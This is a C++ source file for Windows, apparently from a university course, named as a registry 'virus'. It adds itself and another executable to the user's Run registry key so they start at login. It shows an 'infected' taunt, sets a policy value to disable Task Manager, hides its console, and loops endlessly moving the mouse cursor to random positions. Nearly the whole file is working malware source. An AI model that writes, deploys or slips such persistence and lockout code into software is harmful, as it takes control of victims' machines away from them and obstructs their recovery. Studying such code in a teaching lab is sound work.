// Week10-RegVirus.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
using namespace std;

int main()
{
    HKEY RunKey, SysKey;
    DWORD dwData = 1;
    LPCTSTR valueP = TEXT("CO1508");
    LPCTSTR valueV = TEXT("Virus");
    LPCTSTR data = TEXT("c:\\WINDOWS\\system32\\Week10-RegVirus.exe");
    TCHAR VPath[MAX_PATH + 1];

    GetModuleFileName(NULL, VPath, MAX_PATH); // It retrieves the fully qualified path for the file that contains 
                                              // the specified module.The module must have been loaded by 
                                              // the current process.


    if (RegOpenKey(HKEY_CURRENT_USER,
        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RUN"), &RunKey) !=
        ERROR_SUCCESS)
    {
        cout << "unable to open registry key. Exit.\n";
        return 0;
    }

    LONG PaintRun = RegSetValueEx(RunKey, valueP, 0, REG_SZ, (LPBYTE)data, lstrlen(data) * sizeof(TCHAR));
    LONG RegVirusRun = RegSetValueEx(RunKey, valueV, 0, REG_SZ, (LPBYTE)VPath, lstrlen(VPath) * sizeof(TCHAR));

    if (RegVirusRun)
    {
        RegCloseKey(RunKey);
        cout << "unable to open registry value. Exit.\n";
        return 0;
    }
    else
    {
        RegCloseKey(RunKey);
        cout << "Registry value is successfully set !\n";
        MessageBox(NULL, L"You are infected :- I dare you to restart!", L"INFECTION", MB_OKCANCEL);
    }

    LONG openRes =
    RegCreateKeyEx(HKEY_CURRENT_USER,L"Software\\Microsoft\\WindowszzCurrentVersion\\Policies\\System"
    ,0, NULL, REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS, NULL,&SysKey,NULL);

    if (openRes)
    {
        cout << "Error" << openRes << "\n";
        return 0;
    }

    RegSetValueEx(SysKey, L"DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&dwData, sizeof(DWORD));
    RegCloseKey(SysKey);
    
    while (1)
    {
        srand(time(NULL)); // Initialises the pseudo random number generator with a value
        HWND hwnd = GetConsoleWindow(); // retrieves the window handle used by the console associated
                                        // with the calling process.
        POINT point; // this class represents an x-y coordinate point on a two-dimensional integer grid.
        GetCursorPos(&point); // retrieves the position of the mouse cursor, in screen
                              // coordinatesand point the value in& point.
        ShowWindow(hwnd, SW_HIDE); //  sets the specified window show state.
        for (int i = 0; i < 500000; i++)
        {
            // set x and y coordinates randomly
            point.x = rand() % 2000;
            point.y = rand() % 2000;
        }
        SetCursorPos(point.x, point.y); // sets the mouse cursor to the specified
                                        // coordinates on the screen.
    }
    return 0;
}


// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
